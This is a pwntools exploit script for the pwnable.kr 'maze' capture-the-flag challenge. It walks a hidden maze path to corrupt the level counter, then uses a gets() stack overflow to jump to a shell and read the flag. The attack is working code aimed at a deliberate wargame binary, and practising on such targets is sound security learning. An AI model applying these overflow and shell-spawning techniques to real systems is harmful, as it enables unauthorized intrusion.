#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9014 maze
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'maze')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 9014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
SYSTEM_SH_ADDR = 0x4017B4

io = start()
# since the PRNG is never initialized properly (besides srand(rand())), the game is deterministic
# to get a first working solution i used the code below, which logs all keys i am using and replays them
# next time.

# with open("keylog.txt", "rb") as f:
#     for c in f.read():
#         print(io.recvuntil(b"################################\n").decode(), end="")
#         for _ in range(15):
#             print(io.recvline().decode(), end="")

#         io.send(chr(c).encode())
#         time.sleep(0.001)

# with open("keylog.txt", "ab") as f:
#     while True:
#         print(io.recvuntil(b"################################\n").decode(), end="")
#         for _ in range(15):
#             print(io.recvline().decode(), end="")

#         c = input().encode().strip()
#         f.write(c)
#         io.send(c)

# the solution uses the hidden OPENSESAMI command that opens a "hole" if we are standing at (8, 14).
# using this hole we escape the maze which lets us overwrite stuff in the data section. we overwrite the current level
# and go back to complete it, which will make the game think we are after level 20. then we use the stupid gets bof to
# overwrite return address and just to the win function.
io.sendafter(b"PRESS ANY KEY TO START THE GAME\n", b" ")

io.send(b"ssdssddssdddssasssddddssddddssdssddssddddwddsssddsddsssassdssdssddssddddwddssddsddsssassdssdssddssddddwddswswswswswswssddsdsaddsssassdssdssddssddddwddssddsddsssasewswswswssaadaaaasOPENSESAMI!ssssaaaaddddwwwssswwwsswwswwdddddd")

io.sendlineafter(b"record your name : ", fit({0x38: SYSTEM_SH_ADDR}))

io.sendline(b"echo AAAA; cat flag")
io.recvuntil(b"AAAA\n")
success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
